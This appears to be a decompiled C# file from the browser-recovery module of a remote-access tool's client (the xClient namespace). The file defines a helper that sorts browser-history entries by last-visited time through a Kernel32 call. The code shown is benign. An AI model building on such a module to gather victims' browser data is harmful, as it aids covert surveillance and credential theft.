using System;
using System.Collections;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;

namespace xClient.Core.Recovery.Browsers
{
	// Token: 0x020000C7 RID: 199
	public class SortFileTimeAscendingHelper : IComparer
	{
		// Token: 0x06000519 RID: 1305 RVA: 0x00012940 File Offset: 0x00010B40
		int IComparer.Compare(object a, object b)
		{
			return SortFileTimeAscendingHelper.CompareFileTime(ref ((STATURL)a).ftLastVisited, ref ((STATURL)b).ftLastVisited);
		}

		// Token: 0x0600051A RID: 1306
		[DllImport("Kernel32.dll")]
		private static extern int CompareFileTime([In] ref System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime1, [In] ref System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime2);

		// Token: 0x0600051B RID: 1307 RVA: 0x000047DA File Offset: 0x000029DA
		public static IComparer SortFileTimeAscending()
		{
			return new SortFileTimeAscendingHelper();
		}
	}
}
